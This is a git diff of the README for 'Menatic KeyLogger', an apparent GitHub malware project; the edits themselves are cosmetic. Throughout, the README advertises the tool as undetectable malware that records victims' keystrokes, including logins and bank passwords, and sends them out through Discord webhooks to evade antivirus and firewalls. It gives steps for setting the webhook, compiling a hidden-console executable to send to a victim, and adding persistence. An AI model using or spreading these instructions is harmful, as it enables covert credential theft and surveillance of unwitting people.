@@ -1,4 +1,4 @@
-# Menatic_KeyLogger
+# Menatic KeyLogger
 
 ![Python Version](https://img.shields.io/badge/python-3.x-blue?style=flat&logo=python)
 ![OS](https://img.shields.io/badge/OS-GNU%2FLinux-red?style=flat&logo=linux)
@@ -8,11 +8,12 @@
 ![GitHub](https://img.shields.io/github/stars/Menatic007/Menatic-SubDominator?style=social)
 
 
+![unknown](https://user-images.githubusercontent.com/102872534/187035669-18b1ca0a-4d86-4a35-88ec-71f6ed561008.png)
 
 
 ## **Description**
 
-Menatic Keylogger is a fully undetectable malware that will capture all keystrokes from a victim machine and use discord webhooks to transfer these keystrokes to the attacker machine, without causing anything suspicious to take place that in-turn will trigger most anti-virus softwares. Discord webhooks will be considered as normal discord traffic, thus blends away our malicious activities even from network firewalls. 
+Menatic Keylogger is a fully undetectable malware that will capture all keystrokes from a victim machine and use discord webhooks to transfer these keystrokes to the attacker machine, without causing anything suspicious to take place which will trigger anti-virus softwares. Discord webhooks will be considered as normal discord traffic, therefore this blends away our malicious activities even from network firewalls. 
 
   - **All user logins and passwords**
   - **Bank passwords**
@@ -39,6 +40,7 @@ Menatic Keylogger is a fully undetectable malware that will capture all keystrok
 * keyboard
 ## Installation
 
+
 <code>
 
 - git clone https://github.com/Menatic007/Menatic_KeyLogger.git
@@ -51,6 +53,7 @@ Menatic Keylogger is a fully undetectable malware that will capture all keystrok
   
 </code> 
 
+
 ## Usage
 
 First make a discord server or use an existing one.
@@ -61,6 +64,8 @@ Get your webhook url for that particular channel, if you dont know how to, there
 
 Open the script with a text editor and paste the url under `discord_webhooks_url` on line 11.
 
+
+
 <code>
 
 To run this on the victim machine in the form of a python script do the following on the victim machine:
@@ -69,13 +74,15 @@ To run this on the victim machine in the form of a python script do the followin
 
 To run this on the victim machine in the form of a .exe file, do the following before sending it to the victim:
 
-- pyinstaller <***full_path_to_script**> --onefile --noconsole
+- pyinstaller <**full_path_to_script**> --onefile --noconsole
 
 You should find your executable in the dest folder. You can now run the exe file in the victim machine.
 
 Make your own changes to the file for it to gain persistence, we will not be covering that in detail because this is only a **Proof of Concept**
 
 </code>
+
+
 
 ## Built With
 
